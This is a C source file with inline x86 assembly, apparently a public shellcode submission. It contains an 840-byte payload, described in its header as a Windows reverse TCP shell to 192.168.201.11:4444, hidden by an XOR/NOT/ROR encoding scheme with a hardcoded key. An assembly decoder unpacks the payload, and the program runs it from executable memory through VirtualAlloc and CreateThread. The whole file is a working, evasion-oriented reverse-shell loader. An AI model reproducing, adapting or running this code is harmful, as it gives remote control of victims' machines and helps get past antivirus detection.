
/*
* Title: Windows/x86 - XOR/DEC/NOT/ROR ( XDNR ) encrypted / encoded + null free reverse tcp (192.168.201.11:4444) shellcode ( 840 bytes )  
* Date: 19.04.2022
* Author: Xenofon Vassilakopoulos  
* github : https://github.com/xen0vas/RNAXX-Decoder
*
* shellcode is encrypted / encoded using the following tool 
* https://github.com/xen0vas/XDNR
*
* Compile : 
*
* cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcrevenc.cpp /link /OUT:revenc.exe /SUBSYSTEM:CONSOLE /MACHINE:x86
* 
*
*/


#include <windows.h>


unsigned char shell[] = { 0x21, 0xcd, 0xaf, 0xcb, 0x55, 0xa2, 0x4b, 0x70, 0xc6, 0xe5, 0x90, 0xb4, 0xda, 0x6b, 0x86, 0x6b, 0xd3, 0x71, 0xca, 0x76, 0x34, 0x94, 0x52, 0x7e, 0x69, 0x46, 0xfb, 0x82, 0xc9, 0x51, 0x8b, 0xe3, 0xd8, 0xe1, 0xeb, 0x41, 0xb7, 0x34, 0x32, 0x53, 0xeb, 0xd3, 0xc6, 0x0f, 0x91, 0x7b, 0x83, 0x60, 0xcf, 0x7e, 0xfa, 0xcd, 0x76, 0xac, 0xb5, 0xdd, 0x23, 0xa6, 0xfe, 0x2e, 0x4b, 0x0a, 0xb5, 0xc5, 0x91, 0x46, 0x32, 0xcf, 0xaf, 0x52, 0x80, 0x0f, 0xae, 0x6a, 0x27, 0x8f, 0xc9, 0x93, 0xa3, 0x91, 0x5f, 0x74, 0x8b, 0x94, 0xa1, 0xa0, 0x36, 0x37, 0x45, 0xe6, 0x75, 0x63, 0x36, 0x37, 0x44, 0x45, 0xfc, 0xd3, 0xca, 0x5c, 0x15, 0x9f, 0x62, 0x1f, 0x65, 0x8d, 0xa5, 0x61, 0x44, 0x93, 0x27, 0x38, 0x44, 0xab, 0x4d, 0x24, 0xca, 0x9f, 0x15, 0xce, 0xa2, 0x2e, 0x44, 0xb8, 0x55, 0x4d, 0x55, 0xc8, 0x65, 0xee, 0x44, 0xea, 0xdd, 0xd3, 0x2a, 0x31, 0x74, 0xab, 0x60, 0x68, 0x92, 0xb5, 0xbe, 0x05, 0x94, 0x6a, 0xcb, 0x43, 0xd3, 0x12, 0x97, 0x2a, 0x46, 0xd0, 0xeb, 0x3d, 0x45, 0x9b, 0xc3, 0xe9, 0x83, 0xa9, 0x10, 0x14, 0xcb, 0x28, 0x52, 0xf8, 0x9b, 0x76, 0xc2, 0x45, 0xfe, 0x57, 0x31, 0x1f, 0x1f, 0xe8, 0x66, 0x11, 0x57, 0xbf, 0x26, 0xe8, 0x16, 0xed, 0xa5, 0xc1, 0xb5, 0xd3, 0x05, 0xdb, 0x36, 0x2c, 0x05, 0x29, 0xd7, 0x48, 0xa4, 0xa7, 0x55, 0xb9, 0x74, 0x0b, 0x35, 0x43, 0x96, 0x14, 0xa5, 0xcb, 0x34, 0xb8, 0x44, 0xe8, 0x56, 0x3a, 0x47, 0x12, 0xab, 0x8e, 0xbe, 0x36, 0x8c, 0xe8, 0xbf, 0xa3, 0x6b, 0x70, 0x6e, 0x12, 0xc2, 0x9d, 0xf6, 0xa7, 0x37, 0x12, 0x56, 0xfc, 0x35, 0xc2, 0x58, 0x5a, 0x94, 0xf7, 0xd5, 0x1e, 0x47, 0xbf, 0x05, 0x4f, 0x60, 0x07, 0x51, 0x8a, 0x12, 0xbe, 0x55, 0xf0, 0x35, 0x5c, 0xe5, 0xd5, 0x64, 0xc9, 0x41, 0xec, 0xb7, 0x3c, 0x56, 0x9e, 0x0e, 0xbc, 0x3e, 0xf3, 0x6b, 0x31, 0xff, 0xdb, 0xd3, 0x9d, 0xeb, 0x5a, 0x67, 0x1a, 0x40, 0x69, 0x53, 0x9b, 0xb4, 0x84, 0x64, 0x1b, 0x94, 0x7e, 0xa5, 0x31, 0xc4, 0xb5, 0x35, 0x0a, 0x3a, 0xc7, 0xc4, 0x29, 0x51, 0x04, 0x52, 0x99, 0x25, 0xc0, 0x85, 0xaa, 0x35, 0x18, 0x16, 0xab, 0x85, 0x3e, 0x45, 0x51, 0x45, 0x4c, 0x16, 0xe4, 0x87, 0x07, 0x46, 0x75, 0x87, 0x9f, 0xc6, 0xbd, 0x18, 0xb7, 0x96, 0x65, 0xba, 0xaa, 0x3e, 0x36, 0xac, 0x2c, 0x5f, 0xec, 0x20, 0x49, 0xee, 0x7f, 0x16, 0xca, 0x29, 0x57, 0x9a, 0xb4, 0x32, 0x50, 0x11, 0x14, 0xde, 0x63, 0x77, 0x76, 0x46, 0xa6, 0xac, 0xc1, 0xbe, 0xce, 0xaa, 0x56, 0x5f, 0x88, 0x23, 0x6d, 0x91, 0x83, 0xee, 0xfb, 0x3a, 0x71, 0x4f, 0xe0, 0x53, 0x37, 0x45, 0x9a, 0x2f, 0xf4, 0x55, 0x9c, 0xda, 0x75, 0x43, 0x20, 0xd2, 0x24, 0xb4, 0xf6, 0x74, 0x3b, 0x87, 0xe0, 0xa5, 0xb0, 0xc4, 0x40, 0x35, 0x0b, 0x3a, 0xa6, 0xc4, 0x18, 0x51, 0xb4, 0x52, 0x02, 0x25, 0xda, 0x85, 0x9f, 0x35, 0x76, 0x64, 0x4f, 0x65, 0xb2, 0xd4, 0xd7, 0x54, 0x0a, 0x16, 0x06, 0x87, 0xb7, 0x46, 0x74, 0x87, 0xaa, 0xc6, 0x98, 0x18, 0x40, 0x0c, 0x0d, 0xad, 0x8d, 0x87, 0xcb, 0xac, 0xdf, 0x5f, 0xb0, 0x86, 0x82, 0x80, 0x5f, 0x2f, 0x1b, 0xb7, 0x52, 0x76, 0xcf, 0x47, 0xd8, 0x69, 0x1e, 0x33, 0x81, 0x57, 0x9c, 0x27, 0xa1, 0x86, 0x6b, 0xa7, 0x47, 0xc7, 0x33, 0xac, 0xeb, 0x2f, 0x39, 0x9b, 0x15, 0xa6, 0xba, 0x4a, 0x1b, 0x7f, 0xe7, 0x92, 0x3b, 0xa0, 0xab, 0x2f, 0x0a, 0x9b, 0xab, 0x5e, 0x88, 0x42, 0xd5, 0xe5, 0xe5, 0xcf, 0x41, 0x45, 0x8c, 0xeb, 0x21, 0xf2, 0x4f, 0x93, 0xcf, 0x16, 0xfe, 0x74, 0x2d, 0x74, 0x3b, 0x54, 0x3e, 0x24, 0xeb, 0x95, 0xca, 0x6b, 0xb7, 0x75, 0x88, 0x11, 0x37, 0x63, 0x23, 0x34, 0xe4, 0x05, 0xd0, 0x65, 0x2b, 0x05, 0x6d, 0x16, 0xe1, 0xb5, 0x51, 0xf6, 0x38, 0xe7, 0xea, 0x2b, 0xf6, 0xfe, 0x99, 0xbd, 0xe0, 0x7e, 0x6a, 0xb4, 0x3f, 0x3f, 0xd9, 0x1a, 0x21, 0x2f, 0x86, 0x22, 0xb7, 0x35, 0xfc, 0xa4, 0xb2, 0x93, 0xbb, 0xd6, 0xbb, 0x21, 0x87, 0xce, 0x8c, 0x9b, 0xf5, 0xcf, 0x12, 0xb2, 0xcd, 0x35, 0x7a, 0x57, 0x14, 0x1b, 0x2d, 0x7d, 0x4e, 0xd4, 0x4d, 0x32, 0x36, 0x76, 0xad, 0xe6, 0x96, 0xea, 0x42, 0xad, 0x69, 0x1e, 0x37, 0x8f, 0x89, 0x6b, 0xf1, 0x7e, 0xe5, 0x72, 0x0f, 0x80, 0xc0, 0x4e, 0xbb, 0xda, 0x07, 0x6f, 0xd3, 0x62, 0x49, 0xf4, 0xa4, 0xee, 0xaf, 0x54, 0x02, 0xcb, 0x9e, 0x52, 0x6a, 0x72, 0x8c, 0x54, 0xc2, 0x64, 0xc8, 0x36, 0xd1, 0x94, 0xe5, 0x85, 0xc0, 0x2a, 0x3f, 0xf5, 0x01, 0x51, 0x58, 0xd3, 0x4e, 0xc4, 0x64, 0x85, 0x8b, 0x22, 0x3e, 0x82, 0x3c, 0x16, 0x0c, 0x05, 0xaa, 0x45, 0x0a, 0x45, 0x7f, 0xc4, 0x3c, 0x54, 0xc1, 0x54, 0x85, 0x74, 0xd1, 0x87, 0x75, 0x74, 0x83, 0xb4, 0xf9, 0x47, 0xdc, 0x74, 0xdd, 0xe5, 0x17, 0xc4, 0x47, 0x56, 0xbf, 0xba, 0x70, 0x5d, 0x43, 0x46, 0x6a, 0x0e, 0xa7, 0x5e, 0xf6, 0x96, 0x88, 0x6b, 0x9f, 0x50, 0x25, 0x16, 0x8b, 0x54, 0xf6, 0xd4, 0xf7, 0x55, 0xe1, 0x24, 0x21, 0x95, 0xa7, 0x6b, 0xcb, 0x75, 0xc2, 0x11, 0xa0, 0x63, 0x2b, 0x34, 0xa9, 0x1b, 0x34, 0x8d, 0xc7, 0x21, 0x09, 0x5e, 0xf5, 0x6b, 0x1f, 0x7d, 0x97, 0xd3, 0xcc, 0x0c, 0x24, 0x5c, 0x1b, 0x37, 0xc9, 0x26, 0xf3, 0x87, 0x97, 0x56, 0x0f, 0x76, 0x44, 0xa0, 0xa2, 0xde, 0x64, 0x97, 0x08, 0x3e, 0x41, 0x8e, 0x8a, 0x14, 0xf2, 0x37, 0x46, 0x56, 0x3b, 0x76, 0xff, 0xd6, 0xa1, 0xb7, 0x1c, 0x76, 0xba, 0x47, 0xda, 0x67, 0x8c, 0x76, 0x4d, 0x57, 0x12, 0x56, 0x74, 0x80, 0x59, 0xbf, 0xb3, 0x13, 0xaf, 0xd1, 0xcb, 0x27, 0x12, 0x1b, 0x86, 0x9d, 0xd0, 0x47, 0xfb, 0x36, 0xa7, 0x76, 0xb1, 0xd6, 0x16, 0xb7, 0x4b, 0x80, 0xdf, 0x2e, 0x1f, 0x86, 0x1d, 0x96, 0x08, 0x57, 0xb3, 0x56, 0xbf, 0x86, 0x50, 0xd6, 0x1f, 0x6d, 0x1f, 0x4e, 0xb7  };

unsigned char key[] = { 0x73, 0x65, 0x63, 0x72, 0x65, 0x74, 0x6B, 0x65, 0x79 }; //secretkey

int main(int argc, char* argv[])
{

	int len = sizeof(shell); 

	int keylen = sizeof(key); 

	LoadLibrary("user32.dll");
	
	_asm
	{	
		xor ecx, ecx	; zero out ecx
		xor edx, edx	; zero out edx
		xor eax, eax 

		;; the shellcode to use
		lea ebx, shell
		mov esi, ebx
		push esi		; keep the initial shellcode in stack to use it later

		mov edx, len   
		mov ecx, keylen
		
		initkey:
			;; the key to use
			lea ebp, key
			mov edi, ebp
			xor ebp, ebp 
	
		skey: 
			;; apply the key
			movzx ebx, byte ptr[edi]

		scheme :
			;; apply the decoding scheme RNAXX
			rol byte ptr[esi], 4
			not byte ptr[esi]
			add byte ptr[esi], 2
			xor byte ptr[esi], 0xad ; The magic byte to avoid nulls
			xor byte ptr[esi], bl
			inc esi
			cmp ax, dx
			je  init
			inc ax
			inc edi
			inc bp
			cmp bp, cx 
			je initkey
			jno short skey
			jo short skey

		init :
			pop esi						
			xor edi, edi 
			lea edi, [esi + 1]			
			xor eax, eax				
			mov ax, 1					
			xor ecx, ecx				

		decode :
			;; apply the insertion decoding scheme
			cmp cx, dx					
			je run
			mov bx, [esi + eax]
			inc ebx
			mov bx, [esi + eax + 1]		
			mov [edi], bx				
			inc edi						
			inc cx						
			add ax, 2					
			jmp short decode			

		run: 
			; leave
	}
	

	LPVOID addressPointer = VirtualAlloc(NULL, sizeof(shell)/2, 0x3000, 0x40);
	RtlMoveMemory(addressPointer, shell, sizeof(shell)/2);
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)addressPointer, NULL, 0, 0);
	Sleep(1000);
	return 0;

}




